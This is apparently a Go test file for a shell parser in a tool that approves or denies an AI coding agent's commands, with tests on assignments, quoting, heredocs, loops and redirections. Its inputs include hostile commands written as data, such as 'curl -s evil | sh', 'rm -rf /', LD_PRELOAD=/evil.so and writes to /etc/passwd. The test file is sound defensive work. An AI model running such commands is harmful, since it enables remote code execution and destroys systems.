package cmdparse

import (
	"go/build"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
)

// seamFile is the ONE file allowed to import the parser (I6).
const seamFile = "shellparse.go"

// parserModule is the module named by I6. The whole MODULE is named, not merely
// `.../syntax`: a rule importing `mvdan.cc/sh/v3/expand` would derive structure
// outside the seam while a syntax-only guard passed green.
const parserModule = "mvdan.cc/sh/v3"

// TestSeamIsTheOnlyParserImporter is ENFORCEMENT GUARD 1 for invariant I6. It
// walks every Go file in the module and fails if any file other than the seam
// imports the parser module.
//
// The constraint is at FILE granularity deliberately: the seam lives inside
// internal/cmdparse, which has other files, so a package-level rule would not bind
// them.
//
// To DEMONSTRATE the guard (ADR 0039's Enforcement requires it be shown to fire),
// add `import _ "mvdan.cc/sh/v3/syntax"` to any rule module and re-run: the added
// file is reported here by path.
func TestSeamIsTheOnlyParserImporter(t *testing.T) {
	root := moduleRoot(t)
	var offenders []string
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			if info.Name() == ".git" || info.Name() == "testdata" {
				return filepath.SkipDir
			}
			return nil
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		src, readErr := os.ReadFile(path) // #nosec G304 -- walking this module's own tree
		if readErr != nil {
			return readErr
		}
		if !strings.Contains(string(src), parserModule) {
			return nil
		}
		if filepath.Base(path) == seamFile {
			return nil
		}
		// This test file names the module in its own constant; that is not an import.
		if filepath.Base(path) == "shellparse_test.go" {
			return nil
		}
		rel, _ := filepath.Rel(root, path)
		offenders = append(offenders, rel)
		return nil
	})
	if err != nil {
		t.Fatalf("walk module: %v", err)
	}
	if len(offenders) > 0 {
		t.Errorf("I6 violated: only %s may reference %s; found it in: %v",
			seamFile, parserModule, offenders)
	}
}

// TestSeamFileActuallyImportsTheParser is the other half of the guard: a green
// TestSeamIsTheOnlyParserImporter would be vacuous if the seam had stopped
// importing the parser (e.g. after a bad merge), so the positive case is pinned
// too.
func TestSeamFileActuallyImportsTheParser(t *testing.T) {
	pkg, err := build.ImportDir(".", 0)
	if err != nil {
		t.Fatalf("import dir: %v", err)
	}
	found := false
	for _, imp := range pkg.Imports {
		if strings.HasPrefix(imp, parserModule) {
			found = true
		}
	}
	if !found {
		t.Fatalf("the seam does not import %s; the import guard would be vacuous", parserModule)
	}
}

func moduleRoot(t *testing.T) string {
	t.Helper()
	dir, err := filepath.Abs(".")
	if err != nil {
		t.Fatalf("abs: %v", err)
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			t.Fatalf("no go.mod above %s", dir)
		}
		dir = parent
	}
}

// TestShellParse_ParserOptionsAreLoadBearing pins BOTH parser options through
// their OBSERVABLE consequences rather than by reading the construction back.
//
//   - Variant(LangBash): a zsh-only construct MUST be a parse ERROR, not a silent
//     mis-parse. Every dialect figure and the whole of I10 depend on this.
//   - KeepComments(true): a comment MUST be a parser fact, which is what allows the
//     per-line comment pass to be retired by construction. The observable form is
//     that a command with a trailing comment lowers to the command alone, with no
//     comment token anywhere in the leaf and no pre-strip pass involved.
func TestShellParse_ParserOptionsAreLoadBearing(t *testing.T) {
	t.Run("bash variant rejects a zsh-only construct and names the dialect", func(t *testing.T) {
		// Parameter expansion FLAGS — `${(f)var}` — are zsh-only. Under
		// Variant(LangBash) the parser returns a LangError naming zsh, which is what
		// I10's "SHOULD name the dialect where the parser attributes it" rests on.
		// Under any other variant this would parse and be silently mis-structured,
		// which is why the option is part of the decision rather than a default.
		sp := ParseShell("echo ${(f)var}")
		if !sp.Unparseable {
			t.Fatalf("expected a zsh-only construct to be unparseable under LangBash, got %d leaves", len(sp.Leaves))
		}
		if !strings.Contains(sp.Dialect, "zsh") {
			t.Errorf("Dialect = %q, want it to name zsh (I10)", sp.Dialect)
		}
	})

	t.Run("a failure the parser does not attribute names no dialect", func(t *testing.T) {
		// I10: where the parser does NOT attribute the failure, the reason MUST report
		// it without guessing at a cause.
		sp := ParseShell(`echo "unclosed`)
		if !sp.Unparseable {
			t.Fatal("expected an unclosed quote to be unparseable")
		}
		if sp.Dialect != "" {
			t.Errorf("Dialect = %q, want empty — the parser made no attribution", sp.Dialect)
		}
	})

	t.Run("comments never reach a leaf", func(t *testing.T) {
		sp := ParseShell("echo hi # rm -rf /")
		if sp.Unparseable {
			t.Fatalf("unexpected parse failure: %s", sp.Reason)
		}
		if len(sp.Leaves) != 1 {
			t.Fatalf("want 1 leaf, got %d: %v", len(sp.Leaves), sp.Leaves)
		}
		leaf := sp.Leaves[0]
		if leaf.Executable != "echo" || len(leaf.Args) != 1 || leaf.Args[0] != "hi" {
			t.Fatalf("comment leaked into the command: exec=%q args=%v", leaf.Executable, leaf.Args)
		}
		for _, a := range leaf.Args {
			if strings.Contains(a, "rm") {
				t.Fatalf("comment text reached the argument list: %v", leaf.Args)
			}
		}
	})
}

// TestShellParse_PositionIndependentAssignments is the pg2-gkd5e
// POSITION-INDEPENDENCE GUARD, and this bead is its only home: pg2-gkd5e is closed
// with no gating edge and can never resurface to claim it.
//
// `FOO=1 cmd` and `env FOO=1 cmd` MUST reach the same verdict. The two forms land
// in DIFFERENT places in the AST — leading assignments in CallExpr.Assigns, the
// `env` form in Args, where unwrapExecPrefix consumes it — and the lowering MUST
// NOT conflate them: it must route each to the same EnvVars regardless.
func TestShellParse_PositionIndependentAssignments(t *testing.T) {
	forms := []string{
		"LD_PRELOAD=/evil.so cmd",
		"env LD_PRELOAD=/evil.so cmd",
		"command env LD_PRELOAD=/evil.so cmd",
	}
	type shape struct {
		exec    string
		envName string
		envVal  string
	}
	want := shape{exec: "cmd", envName: "LD_PRELOAD", envVal: "/evil.so"}
	for _, form := range forms {
		t.Run(form, func(t *testing.T) {
			sp := ParseShell(form)
			if sp.Unparseable {
				t.Fatalf("unexpected parse failure: %s", sp.Reason)
			}
			if len(sp.Leaves) != 1 {
				t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
			}
			leaf := sp.Leaves[0]
			if leaf.Executable != want.exec {
				t.Errorf("executable = %q, want %q", leaf.Executable, want.exec)
			}
			if len(leaf.EnvVars) != 1 {
				t.Fatalf("want 1 env assignment, got %d: %v", len(leaf.EnvVars), leaf.EnvVars)
			}
			if leaf.EnvVars[0].Name != want.envName || leaf.EnvVars[0].Value != want.envVal {
				t.Errorf("env = %q=%q, want %q=%q",
					leaf.EnvVars[0].Name, leaf.EnvVars[0].Value, want.envName, want.envVal)
			}
		})
	}

	// The two forms must not be conflated in the other direction either: the `env`
	// form's assignment is an ARG in the AST, so a lowering that lifted every
	// assignment-shaped ARG into EnvVars would also lift `cmd FOO=1`, where FOO=1 is
	// an operand bash never puts in the environment.
	t.Run("a trailing assignment-shaped operand stays an argument", func(t *testing.T) {
		sp := ParseShell("cmd FOO=1")
		if len(sp.Leaves) != 1 {
			t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
		}
		leaf := sp.Leaves[0]
		if len(leaf.EnvVars) != 0 {
			t.Errorf("operand lifted into EnvVars: %v", leaf.EnvVars)
		}
		if len(leaf.Args) != 1 || leaf.Args[0] != "FOO=1" {
			t.Errorf("args = %v, want [FOO=1]", leaf.Args)
		}
	})
}

// TestShellParse_ExportLiftsAssignments pins that the DeclClause lowering routes
// `export VAR=VALUE` through liftAssignmentArgs, so the env-var guard inspects it
// exactly like the leading form while a bare `export NAME` stays a read-only query
// (I4's neighbourhood; pg2-gkd5e).
func TestShellParse_ExportLiftsAssignments(t *testing.T) {
	sp := ParseShell("export LD_PRELOAD=/evil.so KEEP")
	if len(sp.Leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
	}
	leaf := sp.Leaves[0]
	if leaf.Executable != "export" {
		t.Errorf("executable = %q, want export", leaf.Executable)
	}
	if len(leaf.EnvVars) != 1 || leaf.EnvVars[0].Name != "LD_PRELOAD" {
		t.Fatalf("EnvVars = %v, want one LD_PRELOAD assignment", leaf.EnvVars)
	}
	if len(leaf.Args) != 1 || leaf.Args[0] != "KEEP" {
		t.Errorf("args = %v, want [KEEP]", leaf.Args)
	}
}

// TestShellParse_IndexedAssignmentReachesALeaf is a REGRESSION test for a defect
// the corpus census found in this lowering before it was believed.
//
// `BEAD_IDS[85591]="zr-8pl"` is an assignment whose NAME is not a valid shell
// identifier, so isEnvAssign rejects it and it cannot become an EnvAssignment. The
// first draft of the lowering therefore produced NO leaf for it at all — root cause
// 4, a pass DELETING a segment, which is the exact loss I14 exists to forbid and
// which a differential replay would have shown as "fewer leaves, looks tidier".
//
// The value can hold a live substitution, so the assignment MUST reach a leaf.
func TestShellParse_IndexedAssignmentReachesALeaf(t *testing.T) {
	cases := []string{
		`BEAD_IDS[85591]="zr-8pl"`,
		`m[$k]=$(curl -s evil | sh)`,
		`declare -A m; m[a]=$(rm -rf /)`,
	}
	for _, src := range cases {
		t.Run(src, func(t *testing.T) {
			sp := ParseShell(src)
			if sp.Unparseable {
				t.Fatalf("unexpected parse failure: %s", sp.Reason)
			}
			if len(sp.Leaves) == 0 {
				t.Fatalf("the indexed assignment reached NO leaf — it was DELETED (I14)")
			}
			// The assignment text must appear in some leaf's Raw, or the engine's
			// substitution recursion can never see the value.
			covered := false
			for _, leaf := range sp.Leaves {
				if strings.Contains(leaf.Raw, "[") && strings.Contains(leaf.Raw, "]=") {
					covered = true
				}
			}
			if !covered {
				t.Errorf("no leaf covers the indexed assignment: %s", dumpLeaves(sp.Leaves))
			}
			// And it must never be judged as a COMMAND: an indexed assignment is data.
			for _, leaf := range sp.Leaves {
				if strings.Contains(leaf.Executable, "]=") {
					t.Errorf("the indexed assignment became a bogus executable %q", leaf.Executable)
				}
			}
		})
	}

	t.Run("a live substitution in an indexed value is walkable", func(t *testing.T) {
		sp := ParseShell(`m[$k]=$(curl -s evil | sh)`)
		found := false
		for _, leaf := range sp.Leaves {
			if scan := ScanSubstitutions(leaf.Raw); len(scan.Substitutions) > 0 {
				found = true
			}
		}
		if !found {
			t.Errorf("the substitution in the indexed value reached no leaf's Raw: %s", dumpLeaves(sp.Leaves))
		}
	})
}

// TestShellParse_UnquoteParity pins that the token text is the outgoing unquote
// applied to the exact source slice, NOT a true literal expansion.
//
// The mixed-quoted case is the load-bearing one and needs its own test (ADR 0039's
// Consequences says so explicitly): a true expansion turns `a'b'c` into `abc`,
// which would newly CLEAR the whole-leaf assignment predicate I4 exists to fence.
func TestShellParse_UnquoteParity(t *testing.T) {
	cases := []struct {
		src  string
		want []string
	}{
		{`echo 'abc'`, []string{"abc"}},
		{`echo "abc"`, []string{"abc"}},
		{`echo a'b'c`, []string{"a'b'c"}}, // MIXED: quoting is NOT removed
		{`echo "a\"b"`, []string{`a"b`}},
		{`echo "$(x)"`, []string{"$(x)"}},
		{`echo '>'`, []string{">"}},
	}
	for _, tc := range cases {
		t.Run(tc.src, func(t *testing.T) {
			sp := ParseShell(tc.src)
			if len(sp.Leaves) != 1 {
				t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
			}
			got := sp.Leaves[0].Args
			if len(got) != len(tc.want) {
				t.Fatalf("args = %v, want %v", got, tc.want)
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Errorf("arg[%d] = %q, want %q", i, got[i], tc.want[i])
				}
			}
			// The outgoing front end is DELETED as of ADR 0039 step 2, so parity can no
			// longer be asserted by running it — it is asserted by REUSE instead: the seam
			// applies the retained `unquote` to each word's exact source slice (see
			// wordToken), so there is no second unquoting to diverge from. The mixed case
			// this migration could have silently changed gets its own test below.
		})
	}

	// A quoted `>` must stay an ARGUMENT, not become a phantom redirection. The
	// outgoing front end needed hasLiveRedirChar for this; the parser makes it
	// structural.
	t.Run("quoted redirection char is an argument", func(t *testing.T) {
		sp := ParseShell(`grep '>' f`)
		leaf := sp.Leaves[0]
		if len(leaf.Redirections) != 0 {
			t.Errorf("phantom redirection: %v", leaf.Redirections)
		}
		if len(leaf.Args) != 2 || leaf.Args[0] != ">" || leaf.Args[1] != "f" {
			t.Errorf("args = %v, want [> f]", leaf.Args)
		}
	})
}

// TestShellParse_ArgLiveExpansion pins pg2-pui5w's per-arg quote/expansion
// PROVENANCE: ArgLiveExpansion rides beside Args (I4 unquote-parity holds —
// Args is asserted unchanged in every case) and distinguishes a genuinely
// live shell expansion from a `$`/backtick byte that survives into Args only
// because it was single-quoted or backslash-escaped. Every AST shape here was
// verified against the real parser (mvdan.cc/sh/v3), not assumed.
func TestShellParse_ArgLiveExpansion(t *testing.T) {
	cases := []struct {
		src      string
		wantArgs []string
		wantLive []bool
	}{
		// Single-quoted `$`/backtick: NOT live, byte-identical to a live one once
		// flattened — the exact gap pg2-rz9ds named.
		{`awk '{print $1}'`, []string{"{print $1}"}, []bool{false}},
		{`sed 's/x$//'`, []string{"s/x$//"}, []bool{false}},
		{"echo 'a$(cmd)b'", []string{"a$(cmd)b"}, []bool{false}},
		// Backslash-escaped `$`, bare and inside double quotes: also NOT live —
		// the parser folds it into a *syntax.Lit rather than a *syntax.ParamExp.
		{`echo \$X`, []string{`\$X`}, []bool{false}},
		{`echo "\$X"`, []string{`\$X`}, []bool{false}},
		// Live expansions: parameter, command substitution (both spellings),
		// arithmetic, process substitution.
		{`echo "$X"`, []string{"$X"}, []bool{true}},
		{`echo "a$(cmd)b"`, []string{"a$(cmd)b"}, []bool{true}},
		{"echo \"a`cmd`b\"", []string{"a`cmd`b"}, []bool{true}},
		{`echo $((1+2))`, []string{"$((1+2))"}, []bool{true}},
		// Multiple args each carry their OWN provenance, independent of neighbors.
		{`awk '{print $1}' $F`, []string{"{print $1}", "$F"}, []bool{false, true}},
		// The pg2-9zgso glued-quote shape: no live expansion either way, and Args
		// keeps the glued quoting verbatim (unwrapping THAT is UnwrapGluedQuotes'
		// job, unaffected by this field).
		{`echo key='value'`, []string{"key='value'"}, []bool{false}},
	}
	for _, tc := range cases {
		t.Run(tc.src, func(t *testing.T) {
			sp := ParseShell(tc.src)
			if len(sp.Leaves) != 1 {
				t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
			}
			leaf := sp.Leaves[0]
			if len(leaf.Args) != len(tc.wantArgs) {
				t.Fatalf("Args = %v, want %v", leaf.Args, tc.wantArgs)
			}
			for i := range leaf.Args {
				if leaf.Args[i] != tc.wantArgs[i] {
					t.Errorf("Args[%d] = %q, want %q", i, leaf.Args[i], tc.wantArgs[i])
				}
			}
			if len(leaf.ArgLiveExpansion) != len(tc.wantLive) {
				t.Fatalf("ArgLiveExpansion = %v, want %v", leaf.ArgLiveExpansion, tc.wantLive)
			}
			for i := range leaf.ArgLiveExpansion {
				if leaf.ArgLiveExpansion[i] != tc.wantLive[i] {
					t.Errorf("ArgLiveExpansion[%d] = %v, want %v", i, leaf.ArgLiveExpansion[i], tc.wantLive[i])
				}
				if got := leaf.ArgIsLiveExpansion(i); got != tc.wantLive[i] {
					t.Errorf("ArgIsLiveExpansion(%d) = %v, want %v", i, got, tc.wantLive[i])
				}
			}
		})
	}

	// ArgIsLiveExpansion is the FAIL-CLOSED accessor: an out-of-range index (and
	// a leaf with no provenance recorded at all) reads as "assume live", never
	// as "assume static".
	t.Run("ArgIsLiveExpansion defaults to live when out of range", func(t *testing.T) {
		var pc ParsedCommand
		if !pc.ArgIsLiveExpansion(0) {
			t.Error("zero-value ParsedCommand: ArgIsLiveExpansion(0) = false, want true (fail-closed default)")
		}
		sp := ParseShell(`awk '{print $1}'`)
		leaf := sp.Leaves[0]
		if leaf.ArgIsLiveExpansion(-1) != true || leaf.ArgIsLiveExpansion(len(leaf.Args)) != true {
			t.Error("out-of-range index did not default to live")
		}
	})

	// unwrapCommand's several reslices of Args (env/command prefixes, the
	// nice/timeout/nohup/stdbuf runners, and export's assignment lift) MUST keep
	// ArgLiveExpansion in lockstep — this is the case those helpers' own reslice
	// arithmetic (argLiveSuffix, liftAssignmentArgs) exists for.
	t.Run("unwrapCommand keeps ArgLiveExpansion aligned through a reslice", func(t *testing.T) {
		sp := ParseShell(`env FOO=1 awk '{print $1}' $F`)
		leaf := sp.Leaves[0]
		if leaf.Executable != "awk" {
			t.Fatalf("Executable = %q, want awk (env prefix should have unwrapped)", leaf.Executable)
		}
		if len(leaf.Args) != 2 || leaf.Args[0] != "{print $1}" || leaf.Args[1] != "$F" {
			t.Fatalf("Args = %v, want [{print $1} $F]", leaf.Args)
		}
		if len(leaf.ArgLiveExpansion) != 2 {
			t.Fatalf("ArgLiveExpansion = %v, want length 2", leaf.ArgLiveExpansion)
		}
		if leaf.ArgLiveExpansion[0] != false || leaf.ArgLiveExpansion[1] != true {
			t.Errorf("ArgLiveExpansion = %v, want [false true]", leaf.ArgLiveExpansion)
		}
	})

	t.Run("export lifts assignments and keeps the remaining arg's provenance", func(t *testing.T) {
		sp := ParseShell(`export FOO=bar '{print $1}'`)
		leaf := sp.Leaves[0]
		if leaf.Executable != "export" {
			t.Fatalf("Executable = %q, want export", leaf.Executable)
		}
		if len(leaf.Args) != 1 || leaf.Args[0] != "{print $1}" {
			t.Fatalf("Args = %v, want [{print $1}] (FOO=bar lifted to EnvVars)", leaf.Args)
		}
		if len(leaf.ArgLiveExpansion) != 1 || leaf.ArgLiveExpansion[0] != false {
			t.Errorf("ArgLiveExpansion = %v, want [false]", leaf.ArgLiveExpansion)
		}
	})
}

// TestShellParse_QuotedMetacharacterArgsDoNotAbstain is pg2-nw3e2's
// investigation of a reported whole-compound abstain: `bd comments add <id>
// "<content>" && tail -1` allegedly approves for plain content but abstains
// once the quoted content carries a bare backtick, a `$VAR` reference, or an
// embedded escaped quote — even though both leaf commands ("bd", "tail") are
// individually on their respective safe-list/build-tool allowlists already
// (ruled out as a missing-entry problem by pg2-lpcpn). The bead asked for
// isolated repro cases in cmdparse's OWN suite, varying one candidate trigger
// at a time, to find out whether cmdparse's tokenization/quote-handling is
// where the whole-compound verdict goes wrong.
//
// CONCLUSION (measured against this commit, 2026-08-25): it is NOT. For all
// four constructs below — (a) bare backtick alone, (b) `$VAR` alone, (c) an
// embedded escaped quote alone, and (d) the full combination verbatim from
// the bead report — ParseShell returns Unparseable=false with a clean
// two-leaf split (`bd ...`, `tail -1`), exactly as it does for the
// plain-content case. cmdparse does not misclassify the command, does not
// fall through to Abstain, and does not even see the two leaves as anything
// but two ordinary simple commands. ArgLiveExpansion — the field that
// actually distinguishes a live shell expansion from an inert quoted/escaped
// byte (see TestShellParse_ArgLiveExpansion above) — is computed correctly in
// every case: false for the escaped backtick and the escaped quote (neither
// is a live expansion), true for the bare `$HOME` (which IS live inside
// double quotes, unescaped).
//
// A manual, uncommitted end-to-end probe of the compiled hook binary against
// all four exact command strings (this worktree, permission_mode=auto and
// =default, cwd=this worktree) also returned "allow" for every one of them —
// "bd" is unconditionally approved by internal/rules/buildtools'
// baseApprovedTools (present since this repo's May 2026 migration commit, long
// before this bead), and "tail -1" clears internal/rules/safecmds
// independently of its neighbor's argument content. So if the reported
// abstain is real, it is NOT a cmdparse tokenization/quote-handling defect —
// the cause, if any, lies downstream of cmdparse (e.g. in
// internal/rules/safecmds or internal/engine's verdict folding) or depends on
// session/config context this minimal repro does not capture. Per this
// bead's scope, no fix belongs here; a follow-up bead (if the abstain can be
// reproduced against the real binary/session) should investigate the
// downstream rule-evaluation layer instead of cmdparse.
//
// KNOWN BUG (pg2-nw3e2), noted but NOT fixed here, and NOT the cause of any
// abstain: case (a)'s escaped backtick byte sequence — a backslash directly
// followed by a backtick, inside a double-quoted string — keeps the escaping
// BACKSLASH in the flattened Args value instead of stripping it. Real
// POSIX/bash strips the backslash before a backtick inside double quotes
// (measured: running the shell builtin echo on the two-character sequence
// backslash-backtick between "a" and "b", inside double quotes, prints
// "a" + backtick + "b" with NO backslash surviving). This is not a new
// defect: parser.go's unquote helper (see its func doc a few hundred lines
// above this file's own package, in parser.go) only special-cases an escaped
// double-quote and an escaped backslash in its switch; any other escaped
// byte — the backtick here, a dollar sign already — falls to its default
// branch, which keeps the backslash. TestShellParse_ArgLiveExpansion already
// pins the identical retention for a backslash-escaped dollar sign (source
// echo "\$X" lowers to Args element "\$X", backslash retained), so this is
// that same documented, symmetric behavior extended to backtick, not a newly
// discovered asymmetry. It does not change ArgLiveExpansion (still correctly
// false — a backslash-escaped byte is never live), so it does not
// misrepresent safety-relevant provenance; it is a cosmetic content
// deviation in the flattened Args string only.
func TestShellParse_QuotedMetacharacterArgsDoNotAbstain(t *testing.T) {
	type wantLeaf struct {
		executable string
		args       []string
		live       []bool
	}
	cases := []struct {
		name string
		src  string
		want []wantLeaf
	}{
		{
			name: "a: bare backtick alone (escaped, inert)",
			src:  "bd comments add 42 \"text with a backtick \\` inside\" && tail -1",
			want: []wantLeaf{
				{"bd", []string{"comments", "add", "42", "text with a backtick \\` inside"}, []bool{false, false, false, false}},
				{"tail", []string{"-1"}, []bool{false}},
			},
		},
		{
			name: "b: $VAR reference alone (unescaped, live)",
			src:  "bd comments add 42 \"text with a dollar $HOME inside\" && tail -1",
			want: []wantLeaf{
				{"bd", []string{"comments", "add", "42", "text with a dollar $HOME inside"}, []bool{false, false, false, true}},
				{"tail", []string{"-1"}, []bool{false}},
			},
		},
		{
			name: "c: embedded escaped quote alone (inert)",
			src:  "bd comments add 42 \"text with \\\"quotes\\\" inside\" && tail -1",
			want: []wantLeaf{
				{"bd", []string{"comments", "add", "42", "text with \"quotes\" inside"}, []bool{false, false, false, false}},
				{"tail", []string{"-1"}, []bool{false}},
			},
		},
		{
			name: "d: full combination, verbatim from the bead report",
			src:  "bd comments add 42 \"text with a backtick \\` and a dollar $HOME and \\\"quotes\\\" inside\" && tail -1",
			want: []wantLeaf{
				{"bd", []string{"comments", "add", "42", "text with a backtick \\` and a dollar $HOME and \"quotes\" inside"}, []bool{false, false, false, true}},
				{"tail", []string{"-1"}, []bool{false}},
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			sp := ParseShell(tc.src)
			if sp.Unparseable {
				t.Fatalf("Unparseable = true (Reason=%q, Dialect=%q), want false — cmdparse abstaining is exactly what this test exists to rule out", sp.Reason, sp.Dialect)
			}
			if len(sp.Leaves) != len(tc.want) {
				t.Fatalf("Leaves = %d, want %d", len(sp.Leaves), len(tc.want))
			}
			for i, wl := range tc.want {
				leaf := sp.Leaves[i]
				if leaf.Executable != wl.executable {
					t.Errorf("Leaves[%d].Executable = %q, want %q", i, leaf.Executable, wl.executable)
				}
				if len(leaf.Args) != len(wl.args) {
					t.Fatalf("Leaves[%d].Args = %v, want %v", i, leaf.Args, wl.args)
				}
				for j := range wl.args {
					if leaf.Args[j] != wl.args[j] {
						t.Errorf("Leaves[%d].Args[%d] = %q, want %q", i, j, leaf.Args[j], wl.args[j])
					}
				}
				if len(leaf.ArgLiveExpansion) != len(wl.live) {
					t.Fatalf("Leaves[%d].ArgLiveExpansion = %v, want %v", i, leaf.ArgLiveExpansion, wl.live)
				}
				for j := range wl.live {
					if leaf.ArgLiveExpansion[j] != wl.live[j] {
						t.Errorf("Leaves[%d].ArgLiveExpansion[%d] = %v, want %v", i, j, leaf.ArgLiveExpansion[j], wl.live[j])
					}
				}
			}
		})
	}
}

// TestShellParse_ResolveLoopsReplacementSemantics pins the EXACT post-pg2-qkecz
// loop semantics, which is what the lowering had to replicate — not the
// pre-fix behaviour.
//
// Hole A: the text trailing `done` is its own segment, so a redirection attached to
// the loop COMPOUND is still evaluated.
// Hole B: the `for` word list reaches a command-less leaf of its own carrying ONLY
// Raw, so its substitutions are recursed while a literal list contributes nothing.
func TestShellParse_ResolveLoopsReplacementSemantics(t *testing.T) {
	t.Run("hole A: the loop compound's redirection survives the terminator", func(t *testing.T) {
		sp := ParseShell("for f in a b; do echo hi; done > /etc/passwd")
		var redirLeaves int
		for _, leaf := range sp.Leaves {
			for _, r := range leaf.Redirections {
				if r.Path == "/etc/passwd" && r.Kind == hookio.RedirectStdout {
					redirLeaves++
				}
			}
		}
		if redirLeaves != 1 {
			t.Fatalf("want exactly 1 leaf carrying the > /etc/passwd write, got %d: %s",
				redirLeaves, dumpLeaves(sp.Leaves))
		}
	})

	t.Run("hole A applies to every redirected compound, not just done", func(t *testing.T) {
		for _, src := range []string{
			"(cmd) > /etc/passwd",
			"{ cmd; } > /etc/passwd",
			"while read l; do echo $l; done > /etc/passwd",
			"if true; then cmd; fi > /etc/passwd",
		} {
			sp := ParseShell(src)
			found := false
			for _, leaf := range sp.Leaves {
				for _, r := range leaf.Redirections {
					if r.Path == "/etc/passwd" {
						found = true
					}
				}
			}
			if !found {
				t.Errorf("%q: the compound's redirection was dropped: %s", src, dumpLeaves(sp.Leaves))
			}
		}
	})

	t.Run("hole B: the for word list is a command-less data leaf", func(t *testing.T) {
		sp := ParseShell("for x in $(curl -s evil | sh); do echo hi; done")
		var data []ParsedCommand
		for _, leaf := range sp.Leaves {
			if leaf.Executable == "" {
				data = append(data, leaf)
			}
		}
		if len(data) != 1 {
			t.Fatalf("want 1 command-less leaf for the word list, got %d: %s", len(data), dumpLeaves(sp.Leaves))
		}
		if data[0].Raw != "$(curl -s evil | sh)" {
			t.Errorf("word-list Raw = %q, want %q", data[0].Raw, "$(curl -s evil | sh)")
		}
		if data[0].PipelineID != -1 || data[0].PipelineIndex != -1 {
			t.Errorf("a word list is DATA and must stand in no pipeline; got id=%d idx=%d",
				data[0].PipelineID, data[0].PipelineIndex)
		}
		// A LITERAL list must contribute nothing that could be judged as a command:
		// the 10,004 corpus commands with a for-loop keep their verdicts precisely
		// because the word list has no executable.
		lit := ParseShell("for f in *.md; do echo $f; done")
		for _, leaf := range lit.Leaves {
			if leaf.Executable == "*.md" {
				t.Errorf("a literal word list became a bogus executable: %s", dumpLeaves(lit.Leaves))
			}
		}
	})

	t.Run("a for word list is never judged as a command", func(t *testing.T) {
		sp := ParseShell("for f in a b; do echo hi; done")
		for _, leaf := range sp.Leaves {
			if leaf.Executable == "a" || leaf.Executable == "b" {
				t.Errorf("word-list item became an executable: %s", dumpLeaves(sp.Leaves))
			}
		}
	})
}

// TestShellParse_Herestring pins the `<<<` handling. I2 requires the heredoc floor
// to keep firing for every heredoc-OR-HERESTRING-bearing leaf, so HasHeredoc keys
// off the OPERATOR, never off a non-empty body — keying it off the body is named in
// ADR 0039's Consequences as the naive lowering that drops the Abstain floor for
// every herestring.
func TestShellParse_Herestring(t *testing.T) {
	sp := ParseShell(`grep x <<<"$word"`)
	if len(sp.Leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d", len(sp.Leaves))
	}
	leaf := sp.Leaves[0]
	if !leaf.HasHeredoc {
		t.Error("a herestring leaf must be heredoc-bearing (I2)")
	}
	if len(leaf.Heredocs) != 0 {
		t.Errorf("a herestring carries its word inline and has NO extent; got %v", leaf.Heredocs)
	}
	if len(leaf.Redirections) != 0 {
		t.Errorf("a herestring is not a path redirection; got %v", leaf.Redirections)
	}
	// An EMPTY heredoc body must not clear the floor either.
	empty := ParseShell("cat <<EOF\nEOF")
	if !empty.Leaves[0].HasHeredoc {
		t.Error("an empty heredoc body must still be heredoc-bearing (I2)")
	}
}

// TestShellParse_HeredocDiscriminator pins I3: identical bytes under `<<EOF` deny
// while `<<'EOF'` abstains, `<<-` tab stripping keeps working for body lines AND
// the terminator line, and the command FOLLOWING a `<<-EOF` block survives.
func TestShellParse_HeredocDiscriminator(t *testing.T) {
	t.Run("quoting discriminator", func(t *testing.T) {
		unq := ParseShell("cat <<EOF\n$(rm -rf /)\nEOF")
		if len(unq.Leaves[0].UnquotedHeredocBodies()) != 1 {
			t.Errorf("an UNQUOTED delimiter must expose its body for recursion; got %v",
				unq.Leaves[0].Heredocs)
		}
		for _, q := range []string{"cat <<'EOF'\n$(rm -rf /)\nEOF", `cat <<"EOF"` + "\n$(rm -rf /)\nEOF", "cat <<\\EOF\n$(rm -rf /)\nEOF"} {
			sp := ParseShell(q)
			if len(sp.Leaves[0].Heredocs) != 1 {
				t.Fatalf("%q: want 1 extent, got %v", q, sp.Leaves[0].Heredocs)
			}
			if !sp.Leaves[0].Heredocs[0].Quoted {
				t.Errorf("%q: delimiter quoting was lost (I3)", q)
			}
			if len(sp.Leaves[0].UnquotedHeredocBodies()) != 0 {
				t.Errorf("%q: a QUOTED body must never be recursed (I3)", q)
			}
		}
	})

	// The outgoing `readHeredocBody` is DELETED as of ADR 0039 step 2, so its bytes
	// are PINNED here as literals instead of compared against a running copy. These
	// are the exact values step 1 measured it produce (LOWERING.md's "Heredoc
	// extents" row: body matches byte for byte, `<<-` included), so the parity claim
	// survives the deletion as data rather than as a second implementation.
	t.Run("body text is the outgoing bytes, pinned", func(t *testing.T) {
		cases := []struct {
			src, body, delim string
			stripTabs        bool
		}{
			{"cat <<EOF\nbody line\nEOF", "body line\n", "EOF", false},
			{"cat <<-EOF\n\ttabbed\n\tEOF", "\ttabbed\n", "EOF", true},
			{"cat <<EOF\na\nb\nEOF", "a\nb\n", "EOF", false},
			{"cat <<EOF\nEOF", "", "EOF", false},
		}
		for _, tc := range cases {
			hds := ParseShell(tc.src).Leaves[0].Heredocs
			if len(hds) != 1 {
				t.Fatalf("%q: want 1 extent, got %d", tc.src, len(hds))
			}
			if hds[0].Body != tc.body {
				t.Errorf("%q: body = %q, want %q", tc.src, hds[0].Body, tc.body)
			}
			if hds[0].Delimiter != tc.delim || hds[0].Quoted || hds[0].StripTabs != tc.stripTabs {
				t.Errorf("%q: extent metadata = %+v", tc.src, hds[0])
			}
		}
	})

	t.Run("the command after a <<-EOF block survives", func(t *testing.T) {
		sp := ParseShell("cat <<-EOF\n\tbody\n\tEOF\necho after")
		found := false
